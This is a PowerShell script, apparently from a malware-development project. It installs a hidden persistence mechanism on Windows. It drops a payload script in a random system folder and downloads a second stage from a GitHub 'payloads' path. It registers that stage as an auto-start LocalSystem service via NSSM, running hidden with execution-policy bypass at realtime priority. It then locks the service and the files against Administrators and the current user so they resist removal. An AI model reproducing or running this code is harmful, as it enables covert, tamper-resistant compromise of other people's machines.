# script must run as admin/SYSTEM
param(
    [string]$rootPath,
    [string]$scriptPath,
    [string]$basePath
)

$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
    "$env:windir\System32\drivers\etc",
    "$env:windir\System32\LogFiles\WMI"
)
echo $basePath >> "C:\Users\maldev\Downloads\init_root_mon.txt"
$nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"
$propertyName = "rootMon"

if(($scriptPath -eq $null) -or ($scriptPath -eq "")){
    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
    $scriptPath = $paths[$idx]
    $scriptPath = "$scriptPath\root_mon.ps1"
    Set-ItemProperty -Path $basePath -Name $propertyName -Value $scriptPath -Force | Out-Null
}

if(($rootPath -eq $null) -or ($rootPath -eq "")){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
}

$serviceName = "MyRootMonService"
$exePath = "powershell.exe"
$arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath $rootPath -basePath '$basePath'"
$downloadPath = "$env:temp\nssm.zip"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    if(-not(Test-Path -Path $downloadPath)){
        iwr -Uri $nssmUrl -OutFile $downloadPath
    }
    Expand-Archive -Path $downloadPath -DestinationPath $env:temp
    Move-Item -Path "$env:temp\nssm-2.24\win64\nssm.exe" -Destination $nssmexe -Force
}

if(-not(Test-Path -Path $scriptPath -PathType Leaf)){
    iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $scriptPath
}

Remove-Item -Path $downloadPath -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse -ErrorAction SilentlyContinue

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\root_mon_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\root_mon_srv.log.error"
& $nssmexe start $serviceName

$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $nssmFolder /A /R /D Y 2>&1 | Out-Null
takeown /F $scriptPath /A /R /D Y 2>&1 | Out-Null

#  Set SYSTEM as owner (prevents inheritance)
icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null

# Remove inheritance and grant SYSTEM full control
icacls $nssmFolder /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $scriptPath /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $scriptPath /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null

# Remov all other users/groups (optional safety measure)
icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $scriptPath /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null

# 4. Explicitly remove your user account
icacls $nssmFolder /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
icacls $scriptPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null


#attrib +h +s +r $nssmFolder
#attrib +h +s +r $scriptPath